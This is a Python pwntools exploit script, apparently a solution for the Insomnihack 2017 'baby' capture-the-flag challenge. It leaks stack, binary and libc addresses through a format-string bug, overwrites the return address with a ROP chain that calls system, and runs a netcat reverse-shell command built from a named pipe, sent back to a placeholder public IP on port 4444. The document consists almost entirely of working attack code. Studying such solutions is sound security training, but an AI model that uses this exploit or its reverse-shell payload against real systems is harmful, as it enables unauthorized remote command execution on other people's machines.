# for x86 format string



# for x86-64 format string
# http://pwning.re/2017/01/22/insomnihack-teaser-baby/

from pwn import *

HOST = "YOUR PUBLIC IP HERE"
PORT = 4444

#Note: netcat openbsd was present in the target -> nc -e /bin/sh doesn't work to get the reverse shell
command = "mknod /tmp/pipe p; /bin/sh 0</tmp/pipe | nc " + HOST + " " + str(PORT) + " 1>/tmp/pipe"

target = "baby.teaser.insomnihack.ch"
port = 1337
r = remote(target, port)

#offsets
mainLibcStackOffset = 0x7fffffffeb38 - 0x7fffffffeaa8
stackOffset = 0x7fffffffe508-0x7fffffffe0f0
systemOffset = 0x7ffff7a53390 - 0x7ffff7a2e830
popRdiOffset = 0x1c8b - 0x19cf

def write2Bytes(bytes, address):
    lenFmt = "%" + str(bytes-17) + "x"
    fmtB = "B"*(24-len(lenFmt)) + lenFmt + "%13$hnBB" + p64(address)
    r.sendline(fmtB + "B"*(1023-len(fmtB)))
    s = r.recvuntil("format > ")

def writeWhatWhere(what, where):
    toWriteA = what & 0xffff
    toWriteB = (what >> 16) & 0xffff
    toWriteC = (what >> 32) & 0xffff
    toWriteD = (what >> 48) & 0xffff
    write2Bytes(toWriteA, where)
    write2Bytes(toWriteB, where+2)
    write2Bytes(toWriteC, where+4)

def leak(address):
    fmt = "A"*24 + "%13$sAAA" + p64(address)
    r.sendline(fmt + "A"*(1023-len(fmt)))
    s = r.recvuntil("format > ")
    sLeak = s[24:30].ljust(8, "\x00")
    return struct.unpack("<Q", sLeak)[0]

s = r.recvuntil("choice > ")
r.sendline("2")
s = r.recvuntil("format > ")
r.sendline("%lx")
s = r.recvuntil("format > ")
sStackAddr = "0x" + s[:s.find("\n")]
stackAddr = int(sStackAddr, 16)
retAddressStack = stackAddr + stackOffset
print("[*] Leak: stackAddr: " + str(hex(stackAddr)))
print("[*] Leak: ret address @ stack: " + str(hex(retAddressStack)))

textAddress = leak(retAddressStack)
print("[*] Leak: original ret address: " + str(hex(textAddress)))

mainLibcStackAddr = retAddressStack + mainLibcStackOffset
libcAddress = leak(mainLibcStackAddr)
print("[*] Leak: <__libc_start_main+240> address: " + str(hex(libcAddress)))

systemAddr = libcAddress + systemOffset
popRdiAddress = textAddress + popRdiOffset
print("[*] Leak: pop rdi address: " + str(hex(popRdiAddress)))

print("--- WRITING ROP CHAIN ---")
print("[*] Overwriting return address with pop rdi")
writeWhatWhere(popRdiAddress, retAddressStack)
print("[*] Writing command address")
writeWhatWhere(stackAddr+8, retAddressStack+8)
print("[*] Writing system address")
writeWhatWhere(systemAddr, retAddressStack+16)

r.sendline("A"*8 + command)
s = r.recvuntil("format > ")

r.sendline("")

print("[*] Exploit complete. Check your reverse shell @ %s:%s" % (HOST, PORT))
r.close()
